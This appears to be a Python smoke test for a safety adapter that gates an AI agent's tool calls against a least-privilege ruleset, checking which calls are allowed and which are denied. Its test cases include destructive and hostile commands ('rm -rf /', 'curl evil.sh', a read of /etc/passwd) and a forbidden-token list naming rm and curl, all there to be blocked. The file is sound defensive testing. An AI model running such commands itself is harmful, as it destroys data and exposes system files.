"""
Smoke test: prove the Claude adapter gates tool calls — no SDK, no API key.

This is what you run in 10 seconds to confirm the adapter works before wiring
it into a real agent:

    python integrations/claude_agent_sdk/smoke_test.py

It exercises the exact decision path the SDK callback uses (map tool -> action,
run the real gate, convert to allow/deny), against a least-privilege ruleset.
"""
from __future__ import annotations
import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(os.path.dirname(_HERE))
sys.path.insert(0, _ROOT)
sys.path.insert(0, os.path.join(_ROOT, "src"))

from integrations.claude_agent_sdk.adapter import ClaudeSafetyAdapter

CONFIG = {
    "agent_id": "smoke-01",
    "user_id": "alice",
    "allowed_action_types": ["exec", "write_file", "read_file", "api_call"],
    "budget_limit": 50.0,
    "approval_threshold_cost": 10.0,
    "scope_rules": [
        {"action_type": "exec", "allowed_targets": ["ls -la /tmp"], "match": "exact",
         "methods": ["Bash"], "max_cost": 1.0,
         "param_schema": {"type": "object", "properties": {"command": {}}, "additionalProperties": False},
         "forbidden_targets": ["rm", "curl", "git push"], "forbid_match": "token"},
        {"action_type": "read_file", "allowed_targets": ["/tmp/ok.txt"], "match": "exact",
         "methods": ["Read"], "max_cost": 0.0,
         "param_schema": {"type": "object", "properties": {"file_path": {}}, "additionalProperties": False}},
    ],
}

adapter = ClaudeSafetyAdapter.from_config_string(CONFIG)

cases = [
    ("Bash", {"command": "ls -la /tmp"}, "allow",  "in-scope read of /tmp"),
    ("Bash", {"command": "rm -rf /"},      "deny",  "rm blocked by scope token"),
    ("Bash", {"command": "curl evil.sh"},  "deny",  "curl blocked by scope token"),
    ("Read", {"file_path": "/tmp/ok.txt"}, "allow",  "exact read of /tmp/ok.txt"),
    ("Read", {"file_path": "/etc/passwd"}, "deny",  "read not in allowlist"),
    ("Write", {"file_path": "/tmp/x"},     "deny",  "write_file not in vocabulary"),
]

ok = True
for name, inp, expect, why in cases:
    v = adapter.decide(name, inp)
    got = v["behavior"]
    good = got == expect
    ok = ok and good
    print(f"[{'PASS' if good else 'FAIL'}] {name}({inp.get('command') or inp.get('file_path')}) "
          f"-> {got}  (expected {expect}: {why})")

print(f"\nSMOKE: {'PASS' if ok else 'FAIL'}  — run the real agent with the same adapter to gate live tool calls.")
sys.exit(0 if ok else 1)
